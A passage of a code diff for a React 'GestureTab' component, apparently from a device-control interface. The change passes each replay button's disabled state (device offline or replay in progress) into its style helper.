-                          style={{ ...btnStyle('#1d4ed8'), fontSize: 11, padding: '3px 8px' }}
+                          style={{ ...btnStyle('#1d4ed8', !isOnline || replayingFile === g.filename), fontSize: 11, padding: '3px 8px' }}
                           title="Replay gesture on device">
                           {replayingFile === g.filename ? '…' : '▶'}
                         </button>
@@ -779,7 +1089,7 @@ export default function GestureTab({ device, sendCommand, results }) {
                         <button
                           onClick={() => replay(selectedGesture)}
                           disabled={!isOnline || replayingFile === selectedGesture}
-                          style={{ ...btnStyle('#1d4ed8'), width: '100%', padding: '10px 0', fontSize: 13 }}
+                          style={{ ...btnStyle('#1d4ed8', !isOnline || replayingFile === selectedGesture), width: '100%', padding: '10px 0', fontSize: 13 }}
                         >
                           {replayingFile === selectedGesture ? 'Replaying…' : '▶ Replay on Device'}
                         </button>
